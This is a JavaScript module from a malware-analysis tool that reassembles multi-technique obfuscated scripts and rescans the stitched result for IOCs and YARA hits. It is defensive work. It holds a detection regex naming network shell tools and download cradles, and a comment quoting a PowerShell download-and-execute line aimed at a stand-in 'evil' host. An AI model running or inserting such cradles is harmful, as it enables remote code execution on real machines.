'use strict';
// ════════════════════════════════════════════════════════════════════════════
// EncodedReassembler — whole-file reconstruction of a script whose
// obfuscation is spread across MULTIPLE parallel techniques (Base64 here,
// char-array there, cmd-obfuscation somewhere else).
//
// `EncodedContentDetector` already unwinds sequential layers inside one
// span via its `innerFindings` tree (Base64 → zlib → PowerShell → command).
// What it cannot do is stitch together N independent spans at N different
// byte offsets. The analyst gets three separate sidebar cards for a dropper
// whose `iex "$a $b $c"` line is the whole payload; reading it back to a
// single runnable script is left to their eyes and clipboard.
//
// This module closes that gap. For each top-level `EncodedContentDetector`
// finding we take the deepest decoded text we can extract, splice it into
// the original source at that finding's byte range, and emit a single
// `reconstructedScript` object. The sidebar paints one composite card
// above the per-finding cards; analysts see the stitched script first
// and drop to per-finding detail only when they need the provenance of a
// particular span.
//
// Language-agnostic by design. Offset-splicing works for every script
// surface (.ps1, .bat/.cmd, .js, .sh, .py, .php, embedded <script> in
// .hta/.svg/.html) without per-language parsers. Variable-flow resolution
// (`$a = base64…; iex $a`) is a future extension; the offset-splicing
// foundation here is a pre-requisite either way.
//
// Mode gating mirrors the existing auto / aggressive / bruteforce tri-mode:
//   • auto        — only findings that SURVIVED `_pruneFindings` in the
//                   detector are eligible; safest default.
//   • aggressive  — same as auto (reassembly is additive signal, not noise
//                   amplification; keeping `aggressive` equivalent keeps
//                   the surface predictable across the two auto modes).
//   • bruteforce  — stitches every finding, including low-confidence decodes;
//                   the analyst opted into noise by clicking the chip.
//
// Non-goals (deliberately deferred — see AGENTS.md plan discussion):
//   • Variable-flow / taint-aware reassembly
//   • Cross-file stitching (multi-stage droppers across archive members)
//   • Re-running EncodedContentDetector on the reconstructed text (phase 3)
//
// Phase 1 scope: build the reconstruction object + the sidebar composite
// card. No re-analysis (Phase 2 adds IOC-diff + decoded-payload YARA scan).
// ════════════════════════════════════════════════════════════════════════════

(function () {

  // ── Tunables (wired through PARSER_LIMITS.REASSEMBLY_* below) ───────────
  // Numeric floors / ceilings that bound CPU and memory. Exceeding any of
  // these produces a reconstructedScript with `truncated = true` rather
  // than an exception; the analyst still gets a partial stitched view.
  const DEFAULTS = Object.freeze({
    MIN_FINDINGS_USED:  2,        // < 2 usable spans → no composite (per-finding card already tells the whole story)
    MIN_COVERAGE:       0.05,     // < 5% of source replaced → no composite
    MAX_FINDINGS:       64,       // cap spans processed per file
    MAX_OUTPUT_BYTES:   4 * 1024 * 1024,  // 4 MiB hard ceiling on reconstructed text
    MAX_DECODE_PREVIEW: 32 * 1024,        // per-span decoded-text slice we splice in
  });

  // Invisible sentinel pair — U+2063 (INVISIBLE SEPARATOR) wrapping every
  // spliced span. Pure whitespace-semantic to the shell interpreter; lets
  // the sidebar locate insertion boundaries in the stitched text without
  // a sidecar offset table and without corrupting tokenisation. Four
  // repeats keeps collisions with raw source effectively impossible.
  const SENTINEL_OPEN  = '\u2063\u2063\u2063\u2063';
  const SENTINEL_CLOSE = '\u2063\u2063\u2063\u2063';

  // ── UTF-8 / UTF-16LE text extraction ────────────────────────────────────
  // Mirrors `_extractTextPreview` in `app-sidebar.js` — a decoded Uint8Array
  // is first tried as UTF-8 (strict, so the control-char heuristic fires
  // only for clean text), then UTF-16LE (common for
  // `[Convert]::FromBase64String("…")` PowerShell payloads). Returns null
  // for binary buffers; callers treat null as "not splice-able".
  function _decodeAsText(bytes) {
    if (!bytes || typeof bytes.byteLength !== 'number' || bytes.byteLength === 0) return null;
    const slice = bytes.slice(0, DEFAULTS.MAX_DECODE_PREVIEW);
    try {
      const t = new TextDecoder('utf-8', { fatal: true }).decode(slice);
      const cc = 0;
      // Count the run of non-printable bytes (ignoring \t \n \r) as a
      // sanity filter. Same 10% threshold the sidebar uses.
      let ctrl = 0;
      for (let i = 0; i < t.length; i++) {
        const cp = t.charCodeAt(i);
        if (cp < 32 && cp !== 9 && cp !== 10 && cp !== 13) ctrl++;
      }
      if (ctrl <= t.length * 0.1) return t;
    } catch (_) { /* not valid UTF-8 — try UTF-16LE */ }
    // UTF-16LE detection: `every-other byte is 0x00` heuristic over the
    // first 64 bytes; same shape probe the detector uses.
    const probe = Math.min(64, slice.length);
    let nulOdd = 0, nulEven = 0;
    for (let i = 0; i < probe; i++) {
      if (slice[i] === 0) (i & 1 ? nulOdd++ : nulEven++);
    }
    const looksUTF16LE = nulOdd > probe * 0.4 || nulEven > probe * 0.4;
    if (looksUTF16LE) {
      try {
        const t = new TextDecoder('utf-16le', { fatal: false }).decode(slice);
        let ctrl = 0;
        for (let i = 0; i < t.length; i++) {
          const cp = t.charCodeAt(i);
          if (cp < 32 && cp !== 9 && cp !== 10 && cp !== 13) ctrl++;
        }
        if (ctrl <= t.length * 0.1) return t;
      } catch (_) { /* fall through */ }
    }
    return null;
  }

  // ── Deepest-wins walk over a finding's innerFindings tree ───────────────
  // Returns the finding node that carries the richest decoded text for
  // this top-level span. Prefers explicit `_deobfuscatedText` (the
  // cmd-obfuscation path), then textual `decodedBytes`, then the outer
  // finding itself if nothing below it produced usable text.
  //
  // Synopsis stubs rejected: `python-obfuscation.js` and
  // `php-obfuscation.js` return human-readable envelopes like
  // `<binary 45B (likely marshal/pickle): 789c…>` as `_deobfuscatedText`
  // when the decoded bytes are non-printable. These are analyst
  // breadcrumbs, NOT actual script source — splicing them into the
  // reassembled body produces nonsense on lines where a real marshal /
  // pickle / zlib blob lived. Treat them as "no usable text" so the
  // finding either contributes a deeper sibling's decoded text or
  // drops out of the reassembly entirely.
  //
  // The regex is deliberately narrow: `^<(?:binary|marshal payload)\b[^>]*>$`
  // matches the two known envelope types anchored start-to-end. New
  // envelope types added by future decoders fall through (visibly
  // wrong output rather than silently corrupt) — fail-open per the
  // `_isClassifierHop` precedent in app-sidebar.js.
  const _PLACEHOLDER_STUB_RE = /^<(?:binary|marshal payload)\b[^>]*>$/;
  function _isPlaceholderStub(t) {
    return typeof t === 'string' && _PLACEHOLDER_STUB_RE.test(t);
  }

  function _pickDeepestTextNode(finding) {
    let best = null;
    let bestDepth = -1;
    const walk = (f, depth) => {
      if (!f || typeof f !== 'object') return;
      const deobf = (typeof f._deobfuscatedText === 'string' && f._deobfuscatedText)
        ? f._deobfuscatedText
        : null;
      const text = (deobf && !_isPlaceholderStub(deobf))
        ? deobf
        : _decodeAsText(f.decodedBytes);
      if (text && !_isPlaceholderStub(text) && depth > bestDepth) {
        best = { node: f, text, depth };
        bestDepth = depth;
      }
      if (Array.isArray(f.innerFindings)) {
        for (const c of f.innerFindings) walk(c, depth + 1);
      }
    };
    walk(finding, 0);
    return best;
  }

  // ── Severity ranking for overlap resolution ─────────────────────────────
  const _SEV_RANK = { info: 1, low: 1, medium: 2, high: 3, critical: 4 };

  /** Build a reconstruction object from a detector's output.
   *
   *  @param {string}  source          the file's analysisText (lf-normalised)
   *  @param {Array}   encodedFindings top-level `EncodedContentDetector.scan()` output
   *  @param {object}  [opts]
   *  @param {string}  [opts.mode]     'auto' | 'aggressive' | 'bruteforce' (default 'auto')
   *  @param {object}  [opts.limits]   override DEFAULTS.*
   *  @returns {object|null}
   *    {
   *      text, spans, sourceMap, coverage, collisions, mode, reconstructedHash,
   *      truncated, techniques, skipReason?
   *    }
   *    Null when there is nothing to stitch (eligible findings < MIN_FINDINGS_USED).
   */
  function build(source, encodedFindings, opts) {
    const mode = (opts && opts.mode) || 'auto';
    const limits = Object.assign({}, DEFAULTS, (opts && opts.limits) || {});
    if (typeof source !== 'string' || source.length === 0) {
      return { skipReason: 'no-source' };
    }
    if (!Array.isArray(encodedFindings) || encodedFindings.length === 0) {
      return { skipReason: 'no-findings' };
    }

    // ── 1. Gather candidate spans ──────────────────────────────────────
    // Each top-level finding contributes AT MOST ONE span (its deepest
    // textual descendant). innerFindings belonging to the same top-level
    // occupy the SAME byte range in the source, so stitching deeper
    // nested spans would double-count the offset.
    const srcLen = source.length;
    const candidates = [];
    let processed = 0;
    for (const f of encodedFindings) {
      if (processed++ >= limits.MAX_FINDINGS) break;
      if (!f || typeof f !== 'object') continue;
      // finder-budget diagnostic stubs and zero-length findings aren't
      // reassembly candidates.
      if (f.encoding === 'finder-budget') continue;
      if (typeof f.offset !== 'number' || typeof f.length !== 'number') continue;
      if (f.length <= 0) continue;
      if (f.offset < 0 || f.offset + f.length > srcLen) continue;

      const pick = _pickDeepestTextNode(f);
      if (!pick || !pick.text || pick.text.length === 0) continue;

      // Mode gating. `auto` / `aggressive` require at least one of:
      //   • the span carries IOCs (including Pattern mirrors —
      //     reassembly cares about the semantic payload, not just
      //     pivotable indicators),
      //   • or the decoded text passes the existing exec-intent gate
      //     (reuse the detector's `_EXEC_INTENT_RE` when visible),
      //   • or the classification is retention-worthy (PE / script /
      //     archive etc.).
      // `bruteforce` skips this gate — analyst opted into noise.
      if (mode !== 'bruteforce') {
        const hasIOCs = Array.isArray(pick.node.iocs) && pick.node.iocs.length > 0;
        const sev = pick.node.severity || f.severity || 'info';
        const highEnough = sev === 'high' || sev === 'critical' || sev === 'medium';
        const execLike = /\b(?:iex|invoke-expression|powershell|cmd\.exe|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|curl|wget|nc|ncat|netcat|bash|sh|python|perl|php|ruby|eval|exec|system|popen|shell_exec|downloadstring|downloadfile|frombase64string|new-object|start-process|shellexecute)\b|https?:\/\/|\/dev\/tcp\//i.test(pick.text);
        if (!hasIOCs && !highEnough && !execLike) continue;
      }

      candidates.push({
        offset: f.offset,
        length: f.length,
        text: pick.text,
        node: pick.node,
        finding: f,
        severity: pick.node.severity || f.severity || 'info',
        chain: (pick.node.chain && pick.node.chain.length) ? pick.node.chain : (f.chain || [f.encoding]),
      });
    }

    if (candidates.length < limits.MIN_FINDINGS_USED) {
      return { skipReason: 'too-few-findings', findingsEligible: candidates.length };
    }

    // ── 2. Sort by offset + resolve overlaps ────────────────────────────
    // Two-finding collision: keep the one with (higher severity, longer
    // decoded text, smaller offset) — ties broken deterministically so
    // the output is reproducible across runs.
    candidates.sort((a, b) => (a.offset - b.offset) || (b.length - a.length));
    const accepted = [];
    const collisions = [];
    for (const c of candidates) {
      const last = accepted.length ? accepted[accepted.length - 1] : null;
      if (last && c.offset < last.offset + last.length) {
        // Overlap. Decide which one stays.
        const lastSev = _SEV_RANK[last.severity] || 0;
        const curSev  = _SEV_RANK[c.severity]    || 0;
        let winner = last, loser = c;
        if (curSev > lastSev ||
            (curSev === lastSev && c.text.length > last.text.length)) {
          winner = c; loser = last;
          accepted[accepted.length - 1] = c;
        }
        collisions.push({
          keptOffset:    winner.offset,
          keptLength:    winner.length,
          keptEncoding:  (winner.finding && winner.finding.encoding) || '',
          droppedOffset: loser.offset,
          droppedLength: loser.length,
          droppedEncoding: (loser.finding && loser.finding.encoding) || '',
        });
        continue;
      }
      accepted.push(c);
    }

    if (accepted.length < limits.MIN_FINDINGS_USED) {
      return { skipReason: 'too-few-after-overlap-resolution',
               findingsEligible: accepted.length,
               collisions };
    }

    // ── 3. Splice accepted spans into the source ───────────────────────
    // Build `text` by interleaving source slices with sentinel-wrapped
    // decoded replacements. Track `spans` with the reconstructed-text
    // offsets so the UI can navigate span boundaries without re-scanning.
    //
    // `sourceMap` entries also carry `strippedOffset` / `strippedLength`
    // (the position in `stripSentinels(text)`) so `analyze()` can map
    // IOC offsets extracted from the sentinel-stripped body back to
    // the originating source region without rescanning. A non-splice
    // entry has `strippedLength === length` (plain source copy-through);
    // a splice entry's `strippedLength` is its decoded text length, but
    // its `sourceOffset` / `sourceLength` point at the ENCODED source
    // region (the honest mapping: the decoded IOC value never existed
    // verbatim in the file, so we surface the encoded region that
    // produced it instead).
    let text = '';
    const spans = [];
    const sourceMap = [];  // { reconOffset, sourceOffset, length, isSplice, strippedOffset, strippedLength, sourceLength? }
    let cursor = 0;  // position in source
    let stripCursor = 0;  // position in sentinel-stripped text
    let truncated = false;
    let bytesReplaced = 0;

    for (const c of accepted) {
      // Copy pre-span source prefix.
      if (c.offset > cursor) {
        const chunk = source.slice(cursor, c.offset);
        sourceMap.push({
          reconOffset: text.length,
          sourceOffset: cursor,
          length: chunk.length,
          isSplice: false,
          strippedOffset: stripCursor,
          strippedLength: chunk.length,
        });
        text += chunk;
        stripCursor += chunk.length;
      }

      // Splice the decoded text wrapped in sentinels. The sentinel pair
      // is always invisible to a shell but easy to locate via indexOf
      // when the UI wants to highlight spliced-in regions.
      const inserted = c.text.length > limits.MAX_DECODE_PREVIEW
        ? c.text.slice(0, limits.MAX_DECODE_PREVIEW)
        : c.text;
      const replaceStart = text.length;
      text += SENTINEL_OPEN;
      const textStart = text.length;
      text += inserted;
      const textEnd = text.length;
      text += SENTINEL_CLOSE;
      const replaceEnd = text.length;
      sourceMap.push({
        reconOffset: replaceStart,
        sourceOffset: c.offset,
        length: c.length,
        isSplice: true,
        sourceLength: c.length,
        strippedOffset: stripCursor,
        strippedLength: inserted.length,
      });
      stripCursor += inserted.length;
      spans.push({
        sourceOffset:   c.offset,
        sourceLength:   c.length,
        replaceStart,       // includes the opening sentinel
        replaceEnd,         // includes the closing sentinel
        textStart,          // just the decoded body
        textEnd,
        chain:          c.chain,
        encoding:       (c.finding && c.finding.encoding) || (c.chain[0] || 'decoded'),
        severity:       c.severity,
        deobfuscatedText: inserted,
        findingOffset:  c.finding.offset,
      });
      bytesReplaced += c.length;
      cursor = c.offset + c.length;

      // Respect the output-byte ceiling. When we breach it, stop
      // splicing more spans and tell the sidebar the reconstruction is
      // partial. Still emit — a partial reconstruction is more useful
      // than none.
      if (text.length >= limits.MAX_OUTPUT_BYTES) {
        truncated = true;
        break;
      }
    }

    // Copy trailing source (only if we didn't bail on truncation).
    if (!truncated && cursor < srcLen) {
      const tail = source.slice(cursor);
      // If appending the tail would breach the ceiling, clip it.
      const room = limits.MAX_OUTPUT_BYTES - text.length;
      if (room > 0) {
        const chunk = room < tail.length ? tail.slice(0, room) : tail;
        sourceMap.push({
          reconOffset: text.length,
          sourceOffset: cursor,
          length: chunk.length,
          isSplice: false,
          strippedOffset: stripCursor,
          strippedLength: chunk.length,
        });
        text += chunk;
        stripCursor += chunk.length;
        if (chunk.length < tail.length) truncated = true;
      } else {
        truncated = true;
      }
    }

    // ── 4. Coverage gate ────────────────────────────────────────────────
    const ratio = srcLen > 0 ? (bytesReplaced / srcLen) : 0;
    if (ratio < limits.MIN_COVERAGE && !truncated) {
      return { skipReason: 'below-coverage', coverage: { ratio, bytesReplaced, sourceBytes: srcLen, findingsUsed: accepted.length } };
    }

    // ── 5. Techniques summary + stable fingerprint ─────────────────────
    const techniqueSet = new Set();
    for (const s of spans) {
      // Prefer the outermost encoding label (technique name the user
      // recognises: "Base64", "CMD Obfuscation", "Char Array"). Fall
      // back to the first chain entry.
      const label = s.encoding || (s.chain && s.chain[0]) || 'encoded';
      techniqueSet.add(String(label));
    }
    const techniques = Array.from(techniqueSet);

    // `reconstructedHash` — stable fingerprint of the stitched text
    // (SHA-256 hex, first 16 chars) for dedupe against a prior
    // reconstruction (e.g. re-scan invocation) and for use in the
    // virtual drill-down filename. Lightweight FNV-1a avoids a
    // cross-realm crypto dependency; 64-bit width is more than enough
    // for per-session dedupe.
    let h = 0xcbf29ce484222325n;
    const FNV_PRIME = 0x100000001b3n;
    const MASK = (1n << 64n) - 1n;
    for (let i = 0; i < text.length; i++) {
      h = (h ^ BigInt(text.charCodeAt(i) & 0xff)) * FNV_PRIME & MASK;
    }
    const reconstructedHash = h.toString(16).padStart(16, '0');

    // ── 6. Severity rollup (max of any contributing span) ──────────────
    let maxSevRank = 0;
    let maxSev = 'info';
    for (const s of spans) {
      const r = _SEV_RANK[s.severity] || 0;
      if (r > maxSevRank) { maxSevRank = r; maxSev = s.severity; }
    }

    return {
      text,
      spans,
      sourceMap,
      coverage: {
        ratio,
        bytesReplaced,
        sourceBytes: srcLen,
        findingsUsed: accepted.length,
      },
      collisions,
      techniques,
      reconstructedHash,
      severity: maxSev,
      mode,
      truncated,
      sentinelOpen: SENTINEL_OPEN,
      sentinelClose: SENTINEL_CLOSE,
    };
  }

  /** Map a reconstructed-text offset back to its originating source
   *  offset. Used by the sidebar's "pivot to original" button on the
   *  composite card. Returns null when the offset doesn't land inside
   *  any known span.
   *
   *  @param {object} reconstructed  a `build()` result
   *  @param {number} reconOffset
   *  @returns {number|null}
   */
  function mapReconToSource(reconstructed, reconOffset) {
    if (!reconstructed || !Array.isArray(reconstructed.sourceMap)) return null;
    for (const entry of reconstructed.sourceMap) {
      const end = entry.reconOffset + entry.length
        + (entry.isSplice ? (SENTINEL_OPEN.length + SENTINEL_CLOSE.length + (entry.sourceLength || 0)) : 0);
      // For splice entries `length` is the SOURCE-side length; the
      // reconstructed span width includes the sentinels + decoded text.
      if (entry.isSplice) {
        const spliceReconEnd = entry.reconOffset + SENTINEL_OPEN.length + (entry.sourceLength || 0) + SENTINEL_CLOSE.length;
        if (reconOffset >= entry.reconOffset && reconOffset < spliceReconEnd) {
          return entry.sourceOffset;
        }
      } else {
        if (reconOffset >= entry.reconOffset && reconOffset < entry.reconOffset + entry.length) {
          return entry.sourceOffset + (reconOffset - entry.reconOffset);
        }
      }
      // next iteration
      void end;
    }
    return null;
  }

  /** Map a sentinel-stripped-text offset back to its originating source
   *  region. Used by `analyze()` to stamp `_sourceOffset` /
   *  `_sourceLength` on novel IOCs — so the sidebar's click-to-focus
   *  handler highlights the ENCODED source region that produced the
   *  decoded bytes, rather than blindly substring-searching `_rawText`
   *  for a value that only ever existed after stitching.
   *
   *  For non-splice entries (verbatim source copy-through) the mapping
   *  is exact: `sourceOffset + (strippedOffset - strippedOffset_entry)`.
   *  For splice entries (decoded text) the decoded IOC value never
   *  existed verbatim in the file; the only honest mapping is the
   *  ENCODED span's `sourceOffset` / `sourceLength` (so the click
   *  flashes the Base64 / char-array / CMD-obfuscation region that
   *  produced the bytes). In that case `sourceLength` is the full
   *  span, not a sub-range, and callers should NOT extend the
   *  highlight beyond it.
   *
   *  @param {object} reconstructed  a `build()` result
   *  @param {number} strippedOffset position in stripSentinels(text)
   *  @returns {{sourceOffset:number,sourceLength:number,isSplice:boolean}|null}
   */
  function mapStrippedToSource(reconstructed, strippedOffset) {
    if (!reconstructed || !Array.isArray(reconstructed.sourceMap)) return null;
    if (typeof strippedOffset !== 'number' || strippedOffset < 0) return null;
    for (const entry of reconstructed.sourceMap) {
      if (typeof entry.strippedOffset !== 'number' || typeof entry.strippedLength !== 'number') continue;
      const end = entry.strippedOffset + entry.strippedLength;
      if (strippedOffset >= entry.strippedOffset && strippedOffset < end) {
        if (entry.isSplice) {
          return {
            sourceOffset: entry.sourceOffset,
            sourceLength: entry.sourceLength || entry.length || 0,
            isSplice: true,
          };
        }
        const delta = strippedOffset - entry.strippedOffset;
        return {
          sourceOffset: entry.sourceOffset + delta,
          sourceLength: 1,   // caller extends via its own length field
          isSplice: false,
        };
      }
    }
    return null;
  }

  /** Strip sentinels from a reconstructed `text`, producing the raw
   *  stitched script suitable for clipboard copy / YARA scan / drill-
   *  down file body. Idempotent.
   *
   *  @param {string} text
   *  @returns {string}
   */
  function stripSentinels(text) {
    if (typeof text !== 'string' || text.length === 0) return '';
    // Two replace passes. The open and close strings are identical
    // today (four U+2063 each) so a single `replaceAll` of the 4-char
    // sequence removes every occurrence.
    // Fall-through supports environments without String.prototype.replaceAll.
    if (typeof text.replaceAll === 'function') {
      return text.replaceAll(SENTINEL_OPEN, '');
    }
    return text.split(SENTINEL_OPEN).join('');
  }

  // ── Phase 2: re-analyse the reconstructed text ────────────────────────
  // Running the IOC regex sweep + decoded-payload YARA scan over the
  // stitched body surfaces signals the per-finding cards could not: a
  // command line like `iex (New-Object Net.WebClient).DownloadString("http://evil/s2")`
  // reads like a single IOC from a reassembled script but had its URL
  // atom (`"http://evil/s2"`) in one finding and its `iex` atom
  // (`Invoke-Expression`) in another. Neither finding triggers a
  // DownloadString-style YARA rule on its own; together they do.
  //
  // Contract — `analyze(reconstructed, opts)`:
  //   reconstructed : the `build()` result (needed for the stripped text
  //                   + reconstructedHash + coverage metadata).
  //   opts.existingIocs : { urls: Set<string>, ips: Set<string>, hashes: Set<string>, ... }
  //                   — caller-provided allow-list of IOCs ALREADY in
  //                   `findings.interestingStrings` + `externalRefs`.
  //                   Any IOC the reassembly surfaces that is already
  //                   in this set is NOT considered novel (it has a
  //                   home in the sidebar already; the point of this
  //                   call is to surface NEW indicators).
  //   opts.extractInterestingStringsCore : injected — we cannot require
  //                   the global here because the reassembler module
  //                   loads before the sidebar-focus / load chain
  //                   wires up the canonical `_extractInterestingStrings`
  //                   shim. Pass `window.extractInterestingStringsCore`
  //                   or a test stub.
  //   opts.workerManager : usually `window.WorkerManager`. Must expose
  //                   `runDecodedYara(payloads, source, opts)` and
  //                   `workersAvailable()` (falsy → YARA skipped).
  //   opts.yaraSource  : YARA rule source text (caller calls
  //                   `app._getAllYaraSource()`). Falsy → YARA skipped.
  //   opts.vbaModuleSources : forwarded to `extractInterestingStringsCore`
  //                   so VBA-module regex masking stays consistent with
  //                   the main-thread call site.
  //
  // Returns: Promise resolving to
  //   {
  //     novelIocs : Array<IOC>,    // same shape as `extractInterestingStringsCore`
  //                                // emits; each tagged `_fromReassembly = true`
  //                                // and `_reconstructedHash = <hash>`.
  //     yaraHits  : Array<{ ruleName, severity, tags, meta? }>,  // deduped
  //     scannedBytes : number,     // size of the sentinel-stripped scan buffer
  //     extractMs    : number,
  //     yaraMs       : number,
  //     skipped      : { extract?: string, yara?: string }  // reason strings
  //   }
  //
  // Never throws — every upstream failure collapses into a populated
  // `skipped` field and an otherwise-empty result. The host site in
  // `app-load.js` then proceeds with whatever the reassembly pipeline
  // did manage to produce.
  async function analyze(reconstructed, opts) {
    const result = {
      novelIocs: [],
      yaraHits: [],
      scannedBytes: 0,
      extractMs: 0,
      yaraMs: 0,
      skipped: {},
    };
    if (!reconstructed || typeof reconstructed.text !== 'string' || reconstructed.text.length === 0) {
      result.skipped.extract = 'no-reconstruction';
      result.skipped.yara    = 'no-reconstruction';
      return result;
    }
    const stripped = stripSentinels(reconstructed.text);
    result.scannedBytes = stripped.length;
    const hash = reconstructed.reconstructedHash || '';

    // ── IOC re-extract ───────────────────────────────────────────────
    // Pure, synchronous, ~ms per MiB. We run it first so the YARA dispatch
    // can piggyback on the same stripped buffer.
    const extractFn = opts && opts.extractInterestingStringsCore;
    const existing  = (opts && opts.existingIocs) || null;
    if (typeof extractFn !== 'function') {
      result.skipped.extract = 'no-extract-fn';
    } else {
      const t0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
      try {
        const vbaModuleSources = (opts && Array.isArray(opts.vbaModuleSources)) ? opts.vbaModuleSources : [];
        const existingValues = existing && existing.allValues
          ? Array.from(existing.allValues)
          : [];
        const coreOut = extractFn(stripped, { existingValues, vbaModuleSources });
        const rows = (coreOut && Array.isArray(coreOut.findings)) ? coreOut.findings : [];
        // Diff against caller's set of known IOC values.
        for (const row of rows) {
          if (!row) continue;
          const v = row.url || row.value;
          if (!v) continue;
          if (existing && existing.allValues && existing.allValues.has(v)) continue;
          // Mark every row the reassembly surfaces so downstream UI /
          // exporters can flag it as "seen only after stitching". The
          // source hash lets tests (and future dedupe) match a specific
          // reassembly invocation.
          row._fromReassembly     = true;
          row._reconstructedHash  = hash;
          // Map the stripped-text offset back to the originating
          // source region so `_findIOCMatches` has an authoritative
          // `_sourceOffset` / `_sourceLength` to anchor the click-to-
          // focus highlight. For IOCs that fall inside a spliced
          // (decoded) region the mapping returns the ENCODED span's
          // offset + length — the only honest pointer, since the
          // decoded value never existed verbatim in the source file.
          // `_findIOCMatches` skips its verbatim-substring fallback
          // for reassembly-derived rows (see app-sidebar-focus.js) so
          // an out-of-file decoded value can't land on an unrelated
          // occurrence of the same literal in plaintext.
          if (typeof row.offset === 'number') {
            const mapped = mapStrippedToSource(reconstructed, row.offset);
            if (mapped) {
              row._sourceOffset = mapped.sourceOffset;
              // For splice entries use the encoded-span length; for
              // verbatim regions use the row's own length (single
              // character when unknown).
              row._sourceLength = mapped.isSplice
                ? mapped.sourceLength
                : (typeof row.length === 'number' && row.length > 0 ? row.length : 1);
            }
          }
          row._highlightText = row.url || row.value;
          result.novelIocs.push(row);
        }
      } catch (_extractErr) {
        result.skipped.extract = 'extract-threw';
      }
      const t1 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
      result.extractMs = Math.max(0, t1 - t0);
    }

    // ── Decoded-payload YARA scan ─────────────────────────────────────
    // One payload (the stripped reconstructed body) under the
    // `decoded-payload` formatTag. Mirrors `DecodedYaraFilter`'s
    // worker-availability gate — a main-thread YARA engine on a
    // multi-MiB buffer would freeze the UI.
    const wm = opts && opts.workerManager;
    const yaraSource = opts && opts.yaraSource;
    if (!wm || typeof wm.runDecodedYara !== 'function') {
      result.skipped.yara = 'no-worker-manager';
    } else if (typeof wm.workersAvailable === 'function' && !wm.workersAvailable()) {
      result.skipped.yara = 'workers-unavailable';
    } else if (!yaraSource || typeof yaraSource !== 'string') {
      result.skipped.yara = 'no-yara-source';
    } else if (stripped.length === 0) {
      result.skipped.yara = 'empty-payload';
    } else {
      const t0 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
      try {
        const bytes = new TextEncoder().encode(stripped);
        const out = await wm.runDecodedYara(
          [{ id: 0, bytes }],
          yaraSource,
          { formatTag: 'decoded-payload' },
        );
        if (out && Array.isArray(out.hits)) {
          const seen = new Set();
          for (const h of out.hits) {
            for (const r of (h.results || [])) {
              if (!r || !r.ruleName || seen.has(r.ruleName)) continue;
              seen.add(r.ruleName);
              result.yaraHits.push({
                ruleName: r.ruleName,
                severity: (r.meta && r.meta.severity) || null,
                tags:     r.tags || '',
                description: (r.meta && r.meta.description) || '',
              });
            }
          }
        }
      } catch (_yaraErr) {
        result.skipped.yara = 'yara-threw';
      }
      const t1 = (typeof performance !== 'undefined' && performance.now) ? performance.now() : Date.now();
      result.yaraMs = Math.max(0, t1 - t0);
    }

    return result;
  }

  window.EncodedReassembler = {
    build,
    analyze,
    mapReconToSource,
    mapStrippedToSource,
    stripSentinels,
    // Exposed for unit tests and the sidebar UI layer.
    DEFAULTS,
    SENTINEL_OPEN,
    SENTINEL_CLOSE,
    // Exposed for the `_decodeAsText` regression tests.
    _decodeAsText,
    _pickDeepestTextNode,
  };

})();
